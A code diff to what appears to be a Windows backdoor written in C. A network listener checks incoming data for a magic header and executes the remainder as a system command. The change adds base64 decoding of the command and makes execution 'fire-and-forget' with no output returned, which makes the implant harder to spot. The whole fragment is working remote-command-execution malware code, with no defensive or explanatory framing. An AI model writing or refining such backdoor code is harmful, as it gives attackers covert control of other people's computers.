@@ -102,23 +102,33 @@ int main()
 
             // Check magic header
             if (bytes_received >= MAGIC_LEN && strncmp(buffer, MAGIC_HEADER, MAGIC_LEN) == 0) {
-                // Extract command
-                int cmd_len = bytes_received - MAGIC_LEN;
-                cmd = (char *)malloc(cmd_len + 1);
-                if (cmd) {
-                    memcpy(cmd, buffer + MAGIC_LEN, cmd_len);
-                    cmd[cmd_len] = '\0';
+                // Extract base64 encoded command
+                int encoded_len = bytes_received - MAGIC_LEN;
+                char *encoded_cmd = (char *)malloc(encoded_len + 1);
+                if (encoded_cmd) {
+                    memcpy(encoded_cmd, buffer + MAGIC_LEN, encoded_len);
+                    encoded_cmd[encoded_len] = '\0';
 
-                    // Execute and capture output
-                    char *output = CaptureProcessOutput(cmd);
+                    // Decode base64
+                    DWORD decoded_len = 0;
+                    if (CryptStringToBinaryA(encoded_cmd, 0, CRYPT_STRING_BASE64, NULL, &decoded_len, NULL, NULL)) {
+                        cmd = (char *)malloc(decoded_len + 1);
+                        if (cmd && CryptStringToBinaryA(encoded_cmd, 0, CRYPT_STRING_BASE64, (BYTE *)cmd, &decoded_len, NULL, NULL)) {
+                            cmd[decoded_len] = '\0';
 
-                    // Send output back (TLS encrypted in real implementation)
-                    if (output) {
-                        send(client_socket, output, strlen(output), 0);
-                        free(output);
+                            // Execute command (fire-and-forget, no output return)
+                            char *output = CaptureProcessOutput(cmd);
+                            if (output) {
+                                free(output);
+                            }
+
+                            free(cmd);
+                        } else {
+                            free(cmd);
+                        }
                     }
 
-                    free(cmd);
+                    free(encoded_cmd);
                 }
             }
         }
